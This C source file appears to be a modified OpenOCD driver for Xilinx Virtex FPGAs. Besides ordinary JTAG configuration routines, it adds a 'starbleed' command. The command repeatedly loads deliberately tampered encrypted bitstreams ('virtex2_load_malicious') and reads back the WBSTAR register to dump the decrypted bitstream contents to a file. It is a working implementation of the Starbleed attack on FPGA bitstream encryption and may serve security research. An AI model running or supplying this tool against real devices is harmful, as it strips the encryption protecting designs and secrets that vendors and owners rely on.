/***************************************************************************
 *   Copyright (C) 2006 by Dominic Rath                                    *
 *   Dominic.Rath@gmx.de                                                   *
 *                                                                         *
 *   This program is free software; you can redistribute it and/or modify  *
 *   it under the terms of the GNU General Public License as published by  *
 *   the Free Software Foundation; either version 2 of the License, or     *
 *   (at your option) any later version.                                   *
 *                                                                         *
 *   This program is distributed in the hope that it will be useful,       *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of        *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         *
 *   GNU General Public License for more details.                          *
 *                                                                         *
 *   You should have received a copy of the GNU General Public License     *
 *   along with this program.  If not, see <http://www.gnu.org/licenses/>. *
 ***************************************************************************/

#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include <time.h>
#include "virtex2.h"
#include "xilinx_bit.h"
#include "pld.h"
#include <sys/random.h>

uint32_t bswap32(const uint32_t input)
{
	uint8_t *buf = (uint8_t *)&input;
	return (uint32_t)((uint32_t)buf[3] | (uint32_t)buf[2] << 8 | (uint32_t)buf[1] << 16 | (uint32_t)buf[0] << 24);
}

static int virtex2_set_instr(struct jtag_tap *tap, uint32_t new_instr)
{
	if (tap == NULL)
		return ERROR_FAIL;

	if (buf_get_u32(tap->cur_instr, 0, tap->ir_length) != new_instr)
	{
		struct scan_field field;

		field.num_bits = tap->ir_length;
		void *t = calloc(DIV_ROUND_UP(field.num_bits, 8), 1);
		field.out_value = t;
		buf_set_u32(t, 0, field.num_bits, new_instr);
		field.in_value = NULL;

		jtag_add_ir_scan(tap, &field, TAP_IDLE);

		free(t);
	}

	return ERROR_OK;
}

static int virtex2_send_32(struct pld_device *pld_device,
						   int num_words, uint32_t *words)
{
	struct virtex2_pld_device *virtex2_info = pld_device->driver_priv;
	struct scan_field scan_field;
	uint8_t *values;
	int i;

	values = malloc(num_words * 4);

	scan_field.num_bits = num_words * 32;
	scan_field.out_value = values;
	scan_field.in_value = NULL;

	for (i = 0; i < num_words; i++)
		buf_set_u32(values + 4 * i, 0, 32, flip_u32(*words++, 32));

	virtex2_set_instr(virtex2_info->tap, 0x5); /* CFG_IN */

	jtag_add_dr_scan(virtex2_info->tap, 1, &scan_field, TAP_DRPAUSE);

	free(values);

	return ERROR_OK;
}

static inline void virtexflip32(jtag_callback_data_t arg)
{
	uint8_t *in = (uint8_t *)arg;
	*((uint32_t *)arg) = flip_u32(le_to_h_u32(in), 32);
}

static int virtex2_receive_32(struct pld_device *pld_device,
							  int num_words, uint32_t *words)
{
	struct virtex2_pld_device *virtex2_info = pld_device->driver_priv;
	struct scan_field scan_field;

	scan_field.num_bits = 32;
	scan_field.out_value = NULL;
	scan_field.in_value = NULL;

	virtex2_set_instr(virtex2_info->tap, 0x4); /* CFG_OUT */

	while (num_words--)
	{
		scan_field.in_value = (uint8_t *)words;

		jtag_add_dr_scan(virtex2_info->tap, 1, &scan_field, TAP_DRPAUSE);

		jtag_add_callback(virtexflip32, (jtag_callback_data_t)words);

		words++;
	}

	return ERROR_OK;
}

static int virtex2_read_stat(struct pld_device *pld_device, uint32_t *status)
{
	uint32_t data[5];

	jtag_add_tlr();

	data[0] = 0xaa995566; /* synch word */
	data[1] = 0x2800E001; /* Type 1, read, address 7, 1 word */
	data[2] = 0x20000000; /* NOOP (Type 1, read, address 0, 0 words */
	data[3] = 0x20000000; /* NOOP */
	data[4] = 0x20000000; /* NOOP */
	virtex2_send_32(pld_device, 5, data);

	virtex2_receive_32(pld_device, 1, status);

	jtag_execute_queue();

	LOG_DEBUG("status: 0x%8.8" PRIx32 "", *status);

	return ERROR_OK;
}

static int virtex2_read_wbstar(struct pld_device *pld_device, uint32_t *status)
{
	uint32_t data[5];

	jtag_add_tlr();

	data[0] = 0xaa995566; /* synch word */
	data[1] = 0x20000000; /* NOOP (Type 1, read, address 0, 0 words */
	data[2] = 0x28020001; /* Type 1, read, address 16, 1 word */
	data[3] = 0x20000000; /* NOOP */
	data[4] = 0x20000000; /* NOOP */
	virtex2_send_32(pld_device, 5, data);

	virtex2_receive_32(pld_device, 1, status);

	jtag_execute_queue();

	return ERROR_OK;
}

static int virtex2_write_wbstar(struct pld_device *pld_device, uint32_t wbstar)
{
	struct virtex2_pld_device *virtex2_info = pld_device->driver_priv;
	unsigned int i;
	struct scan_field field;
	uint8_t *bitstream = (uint8_t *)malloc(384);
	// uint32_t *bitstream_in_word = (uint32_t *)bitstream;
	memcpy(bitstream, write_wbstar_bitstream, 384);
	field.in_value = NULL;

	virtex2_set_instr(virtex2_info->tap, 0xb); /* JPROG_B */
	jtag_execute_queue();
	jtag_add_sleep(1000);

	virtex2_set_instr(virtex2_info->tap, 0x5); /* CFG_IN */
	jtag_execute_queue();

	((uint32_t *)bitstream)[22] = wbstar;

	for (i = 0; i < 384; i++)
		bitstream[i] = flip_u32(bitstream[i], 8);

	field.num_bits = 384 * 8;
	field.out_value = bitstream;
	jtag_add_dr_scan(virtex2_info->tap, 1, &field, TAP_DRPAUSE);
	jtag_execute_queue();

	jtag_add_tlr();

	if (!(virtex2_info->no_jstart))
		virtex2_set_instr(virtex2_info->tap, 0xc); /* JSTART */
	jtag_add_runtest(13, TAP_IDLE);
	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
	if (!(virtex2_info->no_jstart))
		virtex2_set_instr(virtex2_info->tap, 0xc); /* JSTART */
	jtag_add_runtest(13, TAP_IDLE);
	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
	jtag_execute_queue();

	free(bitstream);

	return ERROR_OK;
}

static int virtex2_load(struct pld_device *pld_device, const char *filename)
{
	struct virtex2_pld_device *virtex2_info = pld_device->driver_priv;
	struct xilinx_bit_file bit_file;
	int retval;
	unsigned int i;
	struct scan_field field;

	field.in_value = NULL;

	retval = xilinx_read_bit_file(&bit_file, filename);
	if (retval != ERROR_OK)
		return retval;

	virtex2_set_instr(virtex2_info->tap, 0xb); /* JPROG_B */
	jtag_execute_queue();
	jtag_add_sleep(1000);

	virtex2_set_instr(virtex2_info->tap, 0x5); /* CFG_IN */
	jtag_execute_queue();

	for (i = 0; i < bit_file.length; i++)
		bit_file.data[i] = flip_u32(bit_file.data[i], 8);

	field.num_bits = bit_file.length * 8;
	field.out_value = bit_file.data;

	jtag_add_dr_scan(virtex2_info->tap, 1, &field, TAP_DRPAUSE);
	jtag_execute_queue();

	jtag_add_tlr();

	if (!(virtex2_info->no_jstart))
		virtex2_set_instr(virtex2_info->tap, 0xc); /* JSTART */
	jtag_add_runtest(13, TAP_IDLE);
	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
	if (!(virtex2_info->no_jstart))
		virtex2_set_instr(virtex2_info->tap, 0xc); /* JSTART */
	jtag_add_runtest(13, TAP_IDLE);
	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
	jtag_execute_queue();

	return ERROR_OK;
}

static int virtex2_load_malicious(struct pld_device *pld_device, uint8_t *malicious_bitstream, uint32_t bit_len)
{
	struct virtex2_pld_device *virtex2_info = pld_device->driver_priv;
	unsigned int i;
	struct scan_field field;

	field.in_value = NULL;

	virtex2_set_instr(virtex2_info->tap, 0xb); /* JPROG_B */
	jtag_execute_queue();
	jtag_add_sleep(1000);

	virtex2_set_instr(virtex2_info->tap, 0x5); /* CFG_IN */
	jtag_execute_queue();

	for (i = 0; i < bit_len; i++)
		malicious_bitstream[i] = flip_u32(malicious_bitstream[i], 8);

	field.num_bits = bit_len * 8;
	field.out_value = malicious_bitstream;

	jtag_add_dr_scan(virtex2_info->tap, 1, &field, TAP_DRPAUSE);
	jtag_execute_queue();

	return ERROR_OK;
}

COMMAND_HANDLER(virtex2_handle_read_stat_command)
{
	struct pld_device *device;
	uint32_t status;

	if (CMD_ARGC < 1)
		return ERROR_COMMAND_SYNTAX_ERROR;

	unsigned dev_id;
	COMMAND_PARSE_NUMBER(uint, CMD_ARGV[0], dev_id);
	device = get_pld_device_by_num(dev_id);
	if (!device)
	{
		command_print(CMD, "pld device '#%s' is out of bounds", CMD_ARGV[0]);
		return ERROR_OK;
	}

	virtex2_read_stat(device, &status);

	command_print(CMD, "virtex2 status register: 0x%8.8" PRIx32 "", status);

	return ERROR_OK;
}

COMMAND_HANDLER(virtex2_handle_read_wbstar_command)
{
	struct pld_device *device;
	uint32_t status;

	if (CMD_ARGC < 1)
		return ERROR_COMMAND_SYNTAX_ERROR;

	unsigned dev_id;
	COMMAND_PARSE_NUMBER(uint, CMD_ARGV[0], dev_id);
	device = get_pld_device_by_num(dev_id);
	if (!device)
	{
		command_print(CMD, "pld device '#%s' is out of bounds", CMD_ARGV[0]);
		return ERROR_OK;
	}

	// virtex2_load_malicious(device, write_wbstar_bitstream, sizeof(write_wbstar_bitstream));

	virtex2_read_wbstar(device, &status);
	LOG_INFO("wbstar: 0x%8.8" PRIx32 "", status);

	command_print(CMD, "virtex2 wbstar register: 0x%8.8" PRIx32 "", status);

	return ERROR_OK;
}

COMMAND_HANDLER(virtex2_handle_write_wbstar_command)
{
	struct pld_device *device;
	uint32_t wbstar;
	if (CMD_ARGC < 1)
		return ERROR_COMMAND_SYNTAX_ERROR;

	unsigned dev_id;
	COMMAND_PARSE_NUMBER(uint, CMD_ARGV[0], dev_id);
	COMMAND_PARSE_NUMBER(u32, CMD_ARGV[1], wbstar);
	device = get_pld_device_by_num(dev_id);
	if (!device)
	{
		command_print(CMD, "pld device '#%s' is out of bounds", CMD_ARGV[0]);
		return ERROR_OK;
	}

	wbstar = bswap32(wbstar);
	virtex2_write_wbstar(device, wbstar);

	// command_print(CMD, "virtex2 wbstar register: 0x%8.8" PRIx32 "", status);

	return ERROR_OK;
}

uint64_t get_timestamp(void)
{
	struct timeval tv;
	gettimeofday(&tv, NULL);
	return tv.tv_sec * (uint64_t)1000000 + tv.tv_usec;
}

COMMAND_HANDLER(virtex2_handle_starbleed_command)
{
	struct pld_device *device;
	// uint32_t status;

	struct xilinx_bit_file bit_file, bit_file_mod;
	int retval;
	uint64_t cur_time, prev_time = 0, elapsed_time, eta = 0;

	retval = xilinx_read_bit_file(&bit_file, CMD_ARGV[1]);
	if (retval != ERROR_OK)
		return retval;

	retval = xilinx_read_bit_file(&bit_file_mod, CMD_ARGV[2]);
	if (retval != ERROR_OK)
		return retval;

	FILE *out_file = fopen(CMD_ARGV[3], "wb");

	uint8_t *malicious_bitstream = malloc(bit_file_mod.length);

	if (CMD_ARGC < 2)
		return ERROR_COMMAND_SYNTAX_ERROR;

	unsigned dev_id;
	COMMAND_PARSE_NUMBER(uint, CMD_ARGV[0], dev_id);

	device = get_pld_device_by_num(dev_id);
	if (!device)
	{
		command_print(CMD, "pld device '#%s' is out of bounds", CMD_ARGV[0]);
		return ERROR_OK;
	}

	uint32_t wbstar_reg, prev_wbstar_reg = 0, bswap32wbstar;
	uint8_t xored_val;
	uint32_t rolling_offset, line_num, *fabric_word, total_line_number;
	// uint32_t mask;
	uint32_t masks[2] = {0x89abcdef, 0x23456789};

	LOG_INFO("Cipher Position: %d", bit_file_mod.cipher_start);
	rolling_offset = bit_file_mod.cipher_start + 14 * 4 + 3;

	// for (; position < bit_file.length; position += 1)
	total_line_number = bit_file.dwc_length * 4 / 16;
	// total_line_number = 100;
	// mask = 0x89ABCDEF;

	for (line_num = 1; line_num < total_line_number; line_num++)
	{
		uint32_t wbstars[4] = {0, 0, 0, 0};
		// LOG_INFO("wbstar: %8.8x%8.8x%8.8x%8.8x", wbstars[0], wbstars[1], wbstars[2], wbstars[3]);

		for (xored_val = 0xd; xored_val >= 0xa; xored_val--)
		{
		TRY_ONE_REG:
			for (int maskidx = 0; maskidx < 2; maskidx++)
			{
				memcpy(malicious_bitstream, bit_file_mod.data, bit_file_mod.length);

				// make random
				for (uint32_t i = 0; i < 16; i++)
				{
					malicious_bitstream[bit_file_mod.cipher_start + 16 * 5 + i] = 0xff;
				}

				// place fabric
				for (uint32_t i = 0; i < 32; i++)
				{
					malicious_bitstream[bit_file_mod.cipher_start + 16 * 6 + i] = bit_file.data[bit_file.cipher_start + (line_num - 1) * 16 + i];
				}
				fabric_word = (uint32_t *)(malicious_bitstream + bit_file.cipher_start + 16 * 6);

				// mask
				fabric_word[xored_val - 0xa] ^= bswap32(wbstars[xored_val - 0xa] ^ masks[maskidx]);

				//additional delta
				for (uint32_t i = xored_val + 1; i <= 0xd; i++)
				{
					fabric_word[i - 0xa] ^= bswap32(wbstars[i - 0xa] ^ masks[maskidx] ^ 0x20000000);
				}

				malicious_bitstream[rolling_offset] ^= ((xored_val) ^ 0x1);

				device = get_pld_device_by_num(dev_id);
				if (!device)
				{
					command_print(CMD, "pld device '#%s' is out of bounds", CMD_ARGV[0]);
					return ERROR_OK;
				}

				virtex2_load_malicious(device, malicious_bitstream, bit_file_mod.length);

				virtex2_read_wbstar(device, &wbstar_reg);
				wbstar_reg ^= masks[maskidx];
				if (maskidx > 0)
				{
					if (prev_wbstar_reg != wbstar_reg)
					{
						LOG_INFO("Rolling footer");
						int rd = getrandom(&bit_file_mod.data[bit_file_mod.cipher_start + 8 * 16], bit_file_mod.dwc_length * 4 - 8 * 16, GRND_NONBLOCK);
						if (rd == -1)
						{
							LOG_INFO("Failed to gen random");
						}
						goto TRY_ONE_REG;
					}
				}
				prev_wbstar_reg = wbstar_reg;
			}

			wbstars[xored_val - 0xa] = wbstar_reg;
			if (0)
			{
				LOG_INFO("Xored: %02x, rolling_offset: %d", xored_val, rolling_offset);
				LOG_INFO("wbstar: 0x%8.8" PRIx32 "", wbstar_reg);
			}
		}
		LOG_INFO("progress: %d/%d (%.2f%%), wbstar: %8.8x%8.8x%8.8x%8.8x, ETA(%.2lfh)", line_num, total_line_number, (float)line_num * 100 / (float)total_line_number, wbstars[0], wbstars[1], wbstars[2], wbstars[3], (double)eta / 1000000 / 3600);

		for (int i = 0; i < 4; i++)
		{
			bswap32wbstar = bswap32(wbstars[i]);
			fwrite(&bswap32wbstar, sizeof(uint32_t), 1, out_file);
		}
		if (!(line_num % 50))
		{
			cur_time = get_timestamp();
			elapsed_time = cur_time - prev_time;
			prev_time = cur_time;
			eta = (total_line_number - line_num) * elapsed_time / 50;
			// LOG_INFO("ETA: %lf", (double)eta / 1000000 / 3600);
		}
	}
	fclose(out_file);
	free(malicious_bitstream);
	return ERROR_OK;
}

PLD_DEVICE_COMMAND_HANDLER(virtex2_pld_device_command)
{
	struct jtag_tap *tap;

	struct virtex2_pld_device *virtex2_info;

	if (CMD_ARGC < 2)
		return ERROR_COMMAND_SYNTAX_ERROR;

	tap = jtag_tap_by_string(CMD_ARGV[1]);
	if (tap == NULL)
	{
		command_print(CMD, "Tap: %s does not exist", CMD_ARGV[1]);
		return ERROR_OK;
	}

	virtex2_info = malloc(sizeof(struct virtex2_pld_device));
	virtex2_info->tap = tap;

	virtex2_info->no_jstart = 0;
	if (CMD_ARGC >= 3)
		COMMAND_PARSE_NUMBER(int, CMD_ARGV[2], virtex2_info->no_jstart);

	pld->driver_priv = virtex2_info;

	return ERROR_OK;
}

static const struct command_registration virtex2_exec_command_handlers[] = {
	{
		.name = "read_stat",
		.mode = COMMAND_EXEC,
		.handler = virtex2_handle_read_stat_command,
		.help = "read status register",
		.usage = "pld_num",
	},
	{
		.name = "read_wbstar",
		.mode = COMMAND_EXEC,
		.handler = virtex2_handle_read_wbstar_command,
		.help = "read wbstar register",
		.usage = "pld_num",
	},
	{
		.name = "write_wbstar",
		.mode = COMMAND_EXEC,
		.handler = virtex2_handle_write_wbstar_command,
		.help = "write wbstar register",
		.usage = "pld_num",
	},
	{
		.name = "starbleed",
		.mode = COMMAND_EXEC,
		.handler = virtex2_handle_starbleed_command,
		.help = "dump bitstream via starbleed",
		.usage = "pld_num",
	},
	COMMAND_REGISTRATION_DONE};
static const struct command_registration virtex2_command_handler[] = {
	{
		.name = "virtex2",
		.mode = COMMAND_ANY,
		.help = "Virtex-II specific commands",
		.usage = "",
		.chain = virtex2_exec_command_handlers,
	},
	COMMAND_REGISTRATION_DONE};

struct pld_driver virtex2_pld = {
	.name = "virtex2",
	.commands = virtex2_command_handler,
	.pld_device_command = &virtex2_pld_device_command,
	.load = &virtex2_load,
};
